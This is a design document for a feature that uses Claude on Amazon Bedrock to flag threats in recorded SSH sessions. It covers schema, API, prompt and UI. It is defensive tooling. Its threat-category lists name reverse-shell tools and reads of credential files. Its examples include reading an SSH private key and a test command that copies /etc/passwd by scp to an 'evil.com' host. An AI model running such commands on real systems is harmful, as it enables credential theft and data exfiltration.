# AI-Powered Session Analysis

## Overview

Add AI-powered analysis using Amazon Bedrock (Claude) to automatically detect dangerous patterns and security threats in session recordings.

## Business Value

- **Automated Threat Detection**: Identify security incidents without manual review
- **Compliance**: Meet audit requirements with automated session analysis
- **Incident Response**: Quickly identify high-risk sessions for investigation
- **Proactive Security**: Detect suspicious patterns in real-time

## Technical Approach

### Session Types

| Type | Status | Analysis Method | Complexity |
|------|--------|-----------------|------------|
| SSH (.cast) | **Phase 1** | Command extraction + text analysis | Medium |
| RDP (.mkv) | Phase 2 (future) | OCR + video frame analysis | High |

### Threat Categories

**SSH Session Analysis**:
1. **Privilege Escalation**: `sudo`, `su`, `doas`, privilege mode switches
2. **Data Exfiltration**: `scp`, `rsync`, `wget`, `curl` to external destinations
3. **Credential Access**: Reading `/etc/shadow`, SSH keys, password files
4. **Network Activity**: Reverse shells (`nc`, `ncat`, `socat`), port scanning
5. **Destructive Commands**: `rm -rf /`, `dd`, `mkfs`, data wiping
6. **Persistence Mechanisms**: Cron jobs, systemd services, backdoor installation
7. **Obfuscation**: Base64 payloads, encoded commands, unusual escaping

## Architecture

### Data Flow

```
┌──────────────────────────────────────────┐
│ 1. Session Index Rebuild                 │
│    → Fetch sessions from S3              │
│    → Check which need analysis           │
│    → Queue analysis jobs (if enabled)    │
└──────────────────────────────────────────┘
                  ↓
┌──────────────────────────────────────────┐
│ 2. Analysis Worker (Background Async)    │
│    → Poll analysis_jobs table            │
│    → Fetch .cast content from S3         │
│    → Extract commands from asciinema     │
│    → Send to Bedrock for analysis        │
│    → Parse AI response                   │
│    → Store in session_analysis table     │
└──────────────────────────────────────────┘
                  ↓
┌──────────────────────────────────────────┐
│ 3. Session Playback UI                   │
│    → Load analysis results from DB       │
│    → Display threat level badge          │
│    → Show findings with severity         │
│    → Manual "Analyze Now" button         │
└──────────────────────────────────────────┘
```

### Database Schema

```sql
-- Analysis results storage
CREATE TABLE session_analysis (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id UUID NOT NULL REFERENCES tenants(id) ON DELETE CASCADE,
  session_key VARCHAR(500) NOT NULL,
  session_type VARCHAR(10) NOT NULL,

  -- Analysis metadata
  analyzed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  model_name VARCHAR(100),
  model_version VARCHAR(50),

  -- Results
  threat_level VARCHAR(20),                    -- 'none', 'low', 'medium', 'high', 'critical'
  summary TEXT,
  findings JSONB NOT NULL,                     -- Array of findings
  commands_analyzed INTEGER DEFAULT 0,
  analysis_duration_ms INTEGER,

  -- Timestamps
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

  UNIQUE(tenant_id, session_key)
);

CREATE INDEX idx_analysis_tenant_threat ON session_analysis(tenant_id, threat_level);
CREATE INDEX idx_analysis_tenant_key ON session_analysis(tenant_id, session_key);
CREATE INDEX idx_analysis_threat_level ON session_analysis(threat_level, analyzed_at);

-- Analysis job queue
CREATE TABLE analysis_jobs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id UUID NOT NULL REFERENCES tenants(id) ON DELETE CASCADE,
  session_key VARCHAR(500) NOT NULL,
  session_type VARCHAR(10) NOT NULL,

  -- Job status
  status VARCHAR(20) NOT NULL DEFAULT 'pending',
  priority INTEGER DEFAULT 0,
  started_at TIMESTAMP,
  completed_at TIMESTAMP,
  error_message TEXT,
  retry_count INTEGER DEFAULT 0,
  max_retries INTEGER DEFAULT 3,

  -- Results reference
  analysis_id UUID REFERENCES session_analysis(id),

  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

  UNIQUE(tenant_id, session_key)
);

CREATE INDEX idx_jobs_status ON analysis_jobs(status, priority DESC, created_at);
CREATE INDEX idx_jobs_tenant_status ON analysis_jobs(tenant_id, status);
```

## Configuration

### Environment Variables

```bash
# Master Toggle (single-tenant only)
AI_ANALYSIS_ENABLED=NO                           # YES/NO

# Amazon Bedrock Configuration
AWS_BEDROCK_REGION=us-east-1
AWS_BEDROCK_MODEL_ID=anthropic.claude-3-5-sonnet-20241022-v2:0

# OR: Anthropic API Direct (fallback)
# ANTHROPIC_API_KEY=sk-ant-...
# ANTHROPIC_MODEL=claude-3-5-sonnet-20241022

# Analysis Tuning
AI_ANALYSIS_BATCH_SIZE=10
AI_ANALYSIS_MAX_RETRIES=3
AI_ANALYSIS_TIMEOUT_SECONDS=120
AI_ANALYSIS_WORKER_ENABLED=YES                   # Run background worker process
AI_ANALYSIS_WORKER_INTERVAL_SECONDS=30
```

### Per-Tenant Configuration (Database)

Stored in `tenant_configs` table:

| Config Key | Type | Default | Description |
|------------|------|---------|-------------|
| `opaflix.aiAnalysisEnabled` | boolean | `false` | Enable AI analysis for this tenant |
| `opaflix.aiModel` | string | `claude-3-5-sonnet` | Model: `claude-3-5-sonnet`, `claude-3-haiku` |
| `opaflix.autoAnalyzeSsh` | boolean | `false` | Auto-analyze SSH during rebuild |
| `opaflix.autoAnalyzeRdp` | boolean | `false` | Auto-analyze RDP (future) |
| `opaflix.analysisMaxConcurrent` | integer | `5` | Max parallel analysis jobs |

### UI Configuration Section

Add to `/config` page Settings:

```handlebars
<div class="config-group-header">🤖 AI-Powered Analysis</div>

<div class="config-row">
  <label>Enable AI Analysis</label>
  <select name="opaflix.aiAnalysisEnabled">
    <option value="false">Disabled</option>
    <option value="true">Enabled</option>
  </select>
  <span class="config-hint">Analyze sessions for security threats using Amazon Bedrock</span>
</div>

<div class="config-row" data-depends-on="opaflix.aiAnalysisEnabled">
  <label>AI Model</label>
  <select name="opaflix.aiModel">
    <option value="claude-3-5-sonnet">Claude 3.5 Sonnet (Best)</option>
    <option value="claude-3-haiku">Claude 3 Haiku (Faster)</option>
  </select>
</div>

<div class="config-row" data-depends-on="opaflix.aiAnalysisEnabled">
  <label>Auto-Analyze</label>
  <label><input type="checkbox" name="opaflix.autoAnalyzeSsh"> SSH Sessions</label>
  <label><input type="checkbox" name="opaflix.autoAnalyzeRdp"> RDP Sessions</label>
</div>
```

## Implementation Files

### New Files

1. **`src/services/aiAnalysisService.js`** (~400 lines)
   - Bedrock/Anthropic client initialization
   - Session content fetching from S3
   - Command extraction from .cast files
   - AI prompt engineering
   - Response parsing
   - Result storage

2. **`src/controllers/analysisController.js`** (~200 lines)
   - API endpoint handlers
   - Queue management
   - Status tracking
   - Error handling

3. **`src/routes/analysis.js`** (~50 lines)
   - Route definitions
   - Authentication middleware

4. **`src/workers/analysisWorker.js`** (~250 lines)
   - Background job processor
   - Queue polling
   - Batch processing
   - Retry logic

5. **`public/js/analysis.js`** (~200 lines)
   - "Analyze Now" button handler
   - Status polling
   - Progress indicator
   - Result display

6. **`public/css/analysis.css`** (~150 lines)
   - Threat level badges
   - Findings list styling
   - Analysis results panel

### Modified Files

1. **`src/services/databaseService.js`**
   - Add `session_analysis` and `analysis_jobs` tables to schema

2. **`src/services/sessionIndexService.js`**
   - Call `queueAnalysisJobs()` after fetching sessions (if enabled)

3. **`src/controllers/sessionController.js`**
   - Load analysis results for playback
   - Pass to template

4. **`src/controllers/configController.js`**
   - Handle AI config fields in `showConfig()`
   - Save AI config in `updateConfig()`

5. **`src/views/config.hbs`**
   - Add AI analysis settings to Advanced section

6. **`src/views/sessions/playbackSsh.hbs`**
   - Add analysis results panel
   - Add "Analyze Now" button

7. **`src/views/partials/sessionTable.hbs`**
   - Add analysis status/threat level column

8. **`src/config/environment.js`**
   - Add AI-related environment variable validation

9. **`.env.example`**
   - Document AI configuration variables

10. **`package.json`**
    - Add `@aws-sdk/client-bedrock-runtime` dependency

## API Endpoints

### Analysis Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/analysis/:sessionKey` | Trigger analysis for session |
| `GET` | `/api/analysis/:sessionKey` | Get analysis result |
| `GET` | `/api/analysis/:sessionKey/status` | Get analysis job status |
| `DELETE` | `/api/analysis/:sessionKey` | Delete analysis result (re-analyze) |
| `POST` | `/api/analysis/batch` | Trigger batch analysis |

### Request/Response Examples

**POST /api/analysis/:sessionKey**
```json
{
  "force": false,  // Re-analyze even if already analyzed
  "priority": 0    // Higher priority = process first
}
```

Response:
```json
{
  "success": true,
  "jobId": "uuid",
  "status": "pending",
  "estimatedDuration": "30s"
}
```

**GET /api/analysis/:sessionKey**
```json
{
  "analyzed": true,
  "analyzedAt": "2026-04-08T10:30:00Z",
  "threatLevel": "medium",
  "summary": "Session contains privilege escalation attempts and suspicious file access.",
  "model": "claude-3-5-sonnet",
  "commandsAnalyzed": 47,
  "findings": [
    {
      "severity": "high",
      "type": "privilege_escalation",
      "description": "User executed 'sudo su -' to gain root access",
      "command": "sudo su -",
      "lineNumber": 23,
      "timestamp": "2026-04-02T09:25:15Z"
    }
  ]
}
```

## Asciinema File Format

SSH sessions are stored in `.cast` format (JSON-based):

```json
{
  "version": 2,
  "width": 80,
  "height": 24,
  "timestamp": 1234567890,
  "env": { "SHELL": "/bin/bash", "TERM": "xterm-256color" }
}
[0.123, "o", "$ "]
[1.456, "i", "sudo su -\r\n"]
[2.789, "o", "root@server# "]
```

Format: `[timestamp, type, data]`
- `type="o"`: output (display to screen)
- `type="i"`: input (user typed)

**Command Extraction Strategy**:
1. Parse JSON lines after header
2. Detect command prompts (`$`, `#`, `>`)
3. Extract commands between prompts
4. Handle multiline commands and pipes

## AI Prompt Strategy

### System Prompt Template

```
You are a security analyst reviewing SSH session recordings for suspicious activity.

Analyze the following terminal session and identify security concerns.

Session Metadata:
- Server: {serverName}
- User: {username}
- Project: {projectName}
- Timestamp: {timestamp}
- Commands Executed: {commandCount}

Commands:
{commands}

Provide a JSON response with:
{
  "threatLevel": "none|low|medium|high|critical",
  "summary": "Brief 2-3 sentence summary",
  "findings": [
    {
      "severity": "low|medium|high|critical",
      "type": "privilege_escalation|data_exfiltration|credential_access|network_activity|destructive|persistence|obfuscation",
      "description": "What was detected and why it's concerning",
      "command": "The specific command",
      "lineNumber": 23,
      "recommendation": "Suggested action"
    }
  ]
}

Focus on:
- Privilege escalation (sudo, su, elevation)
- Data exfiltration (scp, curl, wget to external IPs)
- Credential theft (reading shadow files, SSH keys)
- Reverse shells and C2 activity
- Dangerous system modifications
- Persistence mechanisms
```

### Response Parsing

Claude will return structured JSON. Parse and validate:
- Ensure `threatLevel` is valid enum
- Validate `findings` array structure
- Default to "error" state if parsing fails

## Cost Estimation

### Bedrock Pricing (us-east-1, as of 2026)

| Model | Input (per 1M tokens) | Output (per 1M tokens) |
|-------|---------------------|----------------------|
| Claude 3.5 Sonnet | $3.00 | $15.00 |
| Claude 3 Haiku | $0.25 | $1.25 |

### Session Analysis Cost

Typical SSH session: ~100-500 commands

| Commands | Tokens (Input) | Output Tokens | Cost (Sonnet) | Cost (Haiku) |
|----------|---------------|---------------|---------------|--------------|
| 100 | ~5,000 | ~1,000 | $0.03 | $0.002 |
| 500 | ~25,000 | ~2,000 | $0.12 | $0.008 |
| 1,000 | ~50,000 | ~3,000 | $0.20 | $0.015 |

**Example**: Analyzing 10,000 sessions (avg 200 commands each):
- **Sonnet**: ~$600
- **Haiku**: ~$50

## UI/UX Design

### Session List Table

Add "Analysis" column:

| Timestamp | Server | User | Project | Size | **Analysis** | Action |
|-----------|--------|------|---------|------|-------------|--------|
| 2026-04-02 09:23 | opa-gateway | fabio.grasso | prod | 3.2 MB | 🔴 **HIGH** | Play |
| 2026-04-02 08:15 | web-server | john.doe | dev | 1.1 MB | 🟢 **NONE** | Play |
| 2026-04-02 07:30 | db-server | admin | prod | 5.4 MB | ⏳ Pending | Play |

**Badges**:
- 🔴 **CRITICAL** - Red badge
- 🟠 **HIGH** - Orange badge
- 🟡 **MEDIUM** - Yellow badge
- 🔵 **LOW** - Blue badge
- 🟢 **NONE** - Green badge
- ⏳ **Pending** - Gray, clickable to analyze

### Playback Page

**Analysis Results Panel** (beside player):

```
┌─────────────────────────────────────────────┐
│ 🔴 AI SECURITY ANALYSIS: HIGH THREAT         │
├─────────────────────────────────────────────┤
│ This session contains 3 security concerns    │
│ including privilege escalation and           │
│ suspicious file access.                      │
│                                              │
│ Analyzed 47 commands · Claude 3.5 Sonnet    │
├─────────────────────────────────────────────┤
│ Findings (3):                                │
│                                              │
│ 🔴 HIGH - Privilege Escalation               │
│ User executed 'sudo su -' to gain root       │
│ Command: sudo su -                           │
│ Line: 23 · 09:25:15                          │
│                                              │
│ 🟡 MEDIUM - Credential Access                │
│ Accessed SSH private key file                │
│ Command: cat /root/.ssh/id_rsa               │
│ Line: 45 · 09:27:30                          │
│                                              │
│ 🔵 LOW - File Download                       │
│ Downloaded file from external source         │
│ Command: wget https://example.com/script.sh  │
│ Line: 67 · 09:30:12                          │
└─────────────────────────────────────────────┘
```

**Manual Trigger** (if not analyzed):
```
┌─────────────────────────────────────────────┐
│ No AI analysis available for this session    │
│                                              │
│ [Analyze This Session] button                │
└─────────────────────────────────────────────┘
```

## Implementation Phases

### Phase 1: Foundation (MVP)

**Goal**: Basic manual analysis working

1. Database schema (`session_analysis`, `analysis_jobs`)
2. Analysis service with Bedrock integration
3. Command extraction from .cast files
4. API endpoint: `POST /api/analysis/:sessionKey`
5. Simple playback UI: show results if available
6. Manual "Analyze" button

**Deliverable**: Users can click "Analyze" and see results

### Phase 2: Automation

**Goal**: Background processing

7. Analysis worker process
8. Queue integration during index rebuild
9. Auto-analyze based on tenant config
10. Progress tracking UI

**Deliverable**: New sessions auto-analyzed in background

### Phase 3: Advanced Features

**Goal**: Enhanced UX and filtering

11. Threat level badges in session list
12. Filter sessions by threat level
13. Dashboard stats (threats detected, sessions analyzed)
14. Batch analysis UI ("Analyze All" button)
15. Re-analyze capability
16. Analysis history/audit log

**Deliverable**: Full-featured threat detection system

### Phase 4: RDP Analysis (Future)

**Goal**: Video session analysis

17. OCR integration (AWS Textract or Tesseract.js)
18. Frame extraction from .mkv
19. Screen content analysis
20. Mouse/keyboard activity pattern detection

**Deliverable**: RDP session threat detection

## Security & Privacy Considerations

### Data Privacy

⚠️ **Session content is sent to AWS Bedrock for analysis**

- Document in privacy policy
- Ensure Bedrock endpoint doesn't retain data (use private endpoints if required)
- Consider data residency requirements (EU, US, etc.)
- May need explicit user consent

### Cost Control

- Per-tenant rate limiting
- Cost tracking and alerting
- Monthly spending caps
- Disable auto-analysis if budget exceeded

### Access Control

- Analysis results are sensitive (may reveal security incidents)
- Scoped to tenant_id (no cross-tenant access)
- Audit log for who triggered analysis
- Role-based access (future): only security admins see analysis?

## Testing Strategy

### Unit Tests

- Command extraction from .cast files
- Threat level determination logic
- Finding severity classification

### Integration Tests

- End-to-end analysis flow
- Queue processing
- Database operations
- API endpoint responses

### Manual Testing

Test cases:

1. **Normal Session**: No threats detected → threat_level: "none"
2. **Privilege Escalation**: `sudo su -` → threat_level: "high"
3. **Data Exfiltration**: `scp /etc/passwd attacker@evil.com` → threat_level: "critical"
4. **Mixed Activity**: Multiple concerns → multiple findings
5. **Empty Session**: No commands → no analysis needed

## Cost Optimization Strategies

1. **Smart Targeting**: Prioritize sessions from sensitive servers
2. **Caching**: Never re-analyze same session content
3. **Batch Processing**: Group similar sessions for efficient prompting
4. **Model Selection**: Use Haiku for initial scan, Sonnet for flagged sessions
5. **Command Filtering**: Skip common safe commands (ls, pwd, cd)

## Future Enhancements

- **Machine Learning**: Train local models on labeled data
- **Rule-Based Pre-Filter**: Flag obvious threats without AI
- **Integration**: Send high-threat alerts to SIEM/Slack/PagerDuty
- **Compliance Reports**: Generate reports for auditors
- **Anomaly Detection**: Compare user behavior patterns
- **Timeline View**: Visual timeline of suspicious activities
- **Playback Markers**: Jump to suspicious command timestamps in player

## References

- [Amazon Bedrock Documentation](https://docs.aws.amazon.com/bedrock/)
- [Asciinema File Format](https://github.com/asciinema/asciinema/blob/develop/doc/asciicast-v2.md)
- [AWS Bedrock Pricing](https://aws.amazon.com/bedrock/pricing/)
- [Anthropic Claude API](https://docs.anthropic.com/claude/reference/getting-started-with-the-api)

---

**Status**: Design complete, awaiting implementation decision
**Last Updated**: 2026-04-08
